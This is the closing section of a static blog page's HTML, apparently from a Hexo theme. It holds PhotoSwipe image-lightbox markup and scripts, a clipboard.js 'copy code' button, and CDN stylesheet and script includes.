        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>